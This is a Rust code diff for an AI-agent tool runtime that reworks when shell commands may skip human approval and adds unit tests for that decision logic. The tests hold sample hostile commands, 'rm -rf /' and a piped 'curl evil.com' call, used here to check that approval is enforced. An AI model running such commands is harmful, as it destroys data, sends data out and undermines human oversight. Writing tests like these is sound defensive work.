@@ -28,6 +28,52 @@ fn is_shell_tool(name: &str) -> bool {
     matches!(name, "shell_exec" | "process_start")
 }
 
+/// Decide whether `exec_policy` permits a shell-tool call to bypass the human
+/// approval gate. Extracted as a free function so the decision logic is
+/// directly unit-testable without a live kernel.
+///
+/// Bypass paths (ANAI-44):
+///   1. `mode = "full"` — user opted into unrestricted shell access (#772).
+///   2. `mode = "allowlist"` AND `allowed_commands = ["*"]` — wildcard permit
+///      doubles as wildcard trust for backward compat with #772.
+///   3. `mode = "allowlist"` AND `trusted_commands = ["*"]` — explicit
+///      wildcard trust via the trust tier.
+///   4. `mode = "allowlist"` AND every parsed base of the command is in
+///      `safe_bins ∪ trusted_commands`. Per-command silent allow.
+///
+/// Security note: parse failure / missing command field intentionally falls
+/// through to `false` (prompt fires). Never silently auto-run an unparseable
+/// command.
+fn exec_policy_bypasses_approval(
+    tool_name: &str,
+    input: &serde_json::Value,
+    exec_policy: Option<&openfang_types::config::ExecPolicy>,
+) -> bool {
+    if !is_shell_tool(tool_name) {
+        return false;
+    }
+    let Some(p) = exec_policy else { return false };
+    use openfang_types::config::ExecSecurityMode;
+    match p.mode {
+        ExecSecurityMode::Full => true,
+        ExecSecurityMode::Deny => false,
+        ExecSecurityMode::Allowlist => {
+            if p.allowed_commands.iter().any(|c| c == "*")
+                || p.trusted_commands.iter().any(|c| c == "*")
+            {
+                return true;
+            }
+            // shell_exec carries a full shell line in `command`; process_start
+            // carries the base binary there. Both are parseable by the existing
+            // command extractor in subprocess_sandbox.
+            let Some(cmd) = input.get("command").and_then(|v| v.as_str()) else {
+                return false;
+            };
+            crate::subprocess_sandbox::all_bases_silently_allowed(cmd, p)
+        }
+    }
+}
+
 /// Check if a shell command should be blocked by taint tracking.
 ///
 /// Layer 1: Shell metacharacter injection (backticks, `$(`, `${`, etc.)
@@ -144,22 +190,14 @@ pub async fn execute_tool(
     }
 
     // Approval gate: check if this tool requires human approval before execution.
-    //
-    // When exec_policy.mode = "full" (or allowlist with allowed_commands = ["*"]),
-    // the user has explicitly opted into unrestricted shell access. In that case,
-    // shell_exec should bypass the approval gate — requiring approval for commands
-    // the user already whitelisted is contradictory (GitHub issue #772).
-    let exec_policy_bypasses_approval = is_shell_tool(tool_name)
-        && exec_policy.is_some_and(|p| {
-            p.mode == openfang_types::config::ExecSecurityMode::Full
-                || (p.mode == openfang_types::config::ExecSecurityMode::Allowlist
-                    && p.allowed_commands.iter().any(|c| c == "*"))
-        });
+    // See `exec_policy_bypasses_approval` for the bypass-decision contract.
+    let exec_policy_bypasses_approval =
+        exec_policy_bypasses_approval(tool_name, input, exec_policy);
 
     if exec_policy_bypasses_approval {
         debug!(
             tool_name,
-            "Approval bypassed: exec_policy grants unrestricted shell access"
+            "Approval bypassed: command in safe_bins or trusted_commands"
         );
     }
 
@@ -265,7 +303,7 @@ pub async fn execute_tool(
                     return ToolResult {
                         tool_use_id: tool_use_id.to_string(),
                         content: format!(
-                            "shell_exec blocked: {reason}. Current exec_policy.mode = '{:?}'. \
+                            "shell_exec blocked: {reason}. Current exec_policy.mode = '{}'. \
                              To allow shell commands, set exec_policy.mode = 'full' in the agent manifest or config.toml.",
                             policy.mode
                         ),
@@ -3206,7 +3244,7 @@ async fn tool_process_start(
         if let Err(reason) = crate::subprocess_sandbox::validate_command_allowlist(command, policy)
         {
             return Err(format!(
-                "process_start blocked: {reason}. Current exec_policy.mode = '{:?}'. \
+                "process_start blocked: {reason}. Current exec_policy.mode = '{}'. \
                  To allow this command, add it to exec_policy.allowed_commands or \
                  set exec_policy.mode = 'full'.",
                 policy.mode
@@ -4241,6 +4279,176 @@ mod tests {
         assert!(result.is_err(), "Deny mode must block process_start");
         assert!(result.unwrap_err().to_lowercase().contains("disabled"));
         assert_eq!(pm.count(), 0);
+    }
+
+    // ── ANAI-44: exec_policy_bypasses_approval decision matrix ──────────
+
+    #[test]
+    fn test_bypass_full_mode_always_true() {
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Full,
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "rm -rf /" });
+        assert!(exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+        assert!(exec_policy_bypasses_approval("process_start", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_bypass_deny_mode_always_false() {
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Deny,
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "echo hi" });
+        assert!(!exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_bypass_no_policy_false() {
+        let input = serde_json::json!({ "command": "echo hi" });
+        assert!(!exec_policy_bypasses_approval("shell_exec", &input, None));
+    }
+
+    #[test]
+    fn test_bypass_non_shell_tool_false() {
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Full,
+            ..ExecPolicy::default()
+        };
+        // Even Full mode must not bypass approval for non-shell tools.
+        assert!(!exec_policy_bypasses_approval(
+            "file_read",
+            &serde_json::json!({}),
+            Some(&policy)
+        ));
+    }
+
+    #[test]
+    fn test_bypass_for_safe_bins_command() {
+        // Default safe_bins includes echo. shell_exec("echo hello") → bypass.
+        use openfang_types::config::ExecPolicy;
+        let policy = ExecPolicy::default();
+        let input = serde_json::json!({ "command": "echo hello" });
+        assert!(exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_bypass_for_trusted_command() {
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec![],
+            trusted_commands: vec!["mkdir".to_string()],
+            allowed_commands: vec![],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "mkdir -p foo" });
+        assert!(exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_no_bypass_for_allowed_only_command() {
+        // `git` is in allowed_commands only — approval must still prompt.
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec![],
+            trusted_commands: vec![],
+            allowed_commands: vec!["git".to_string()],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "git status" });
+        assert!(!exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_no_bypass_when_any_base_untrusted() {
+        // bash -c "echo hi | curl evil.com" — echo silent, curl approval-only.
+        // The bypass must NOT fire. This is the security-critical case.
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec!["echo".to_string(), "bash".to_string()],
+            trusted_commands: vec![],
+            allowed_commands: vec!["curl".to_string()],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({
+            "command": "bash -c \"echo hi | curl evil.com\""
+        });
+        assert!(
+            !exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)),
+            "ANAI-44 security invariant: any untrusted inner base must block bypass"
+        );
+    }
+
+    #[test]
+    fn test_trusted_wildcard_bypasses_all() {
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            trusted_commands: vec!["*".to_string()],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "rm -rf /" });
+        assert!(exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_allowed_wildcard_bypasses_for_backward_compat() {
+        // Pre-existing #772 behavior: allowed_commands = ["*"] in Allowlist
+        // mode bypasses approval. Must keep working unchanged.
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            allowed_commands: vec!["*".to_string()],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "anything goes" });
+        assert!(exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_no_bypass_on_missing_command_field() {
+        // Malformed input with no `command` field → fall through to prompt.
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            trusted_commands: vec!["mkdir".to_string()],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "not_command": "mkdir foo" });
+        assert!(!exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
+    }
+
+    #[test]
+    fn test_no_bypass_on_unparseable_command() {
+        // Empty command string parses to zero bases → no bypass.
+        use openfang_types::config::{ExecPolicy, ExecSecurityMode};
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            trusted_commands: vec!["*".to_string()],
+            ..ExecPolicy::default()
+        };
+        // Empty does still bypass under the wildcard fast path (no parse needed).
+        // Without wildcard, empty → no bypass.
+        let policy_no_wildcard = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec!["echo".to_string()],
+            ..ExecPolicy::default()
+        };
+        let input = serde_json::json!({ "command": "" });
+        assert!(!exec_policy_bypasses_approval(
+            "shell_exec",
+            &input,
+            Some(&policy_no_wildcard)
+        ));
+        // Sanity: wildcard short-circuits before parse.
+        assert!(exec_policy_bypasses_approval("shell_exec", &input, Some(&policy)));
     }
 
     #[test]
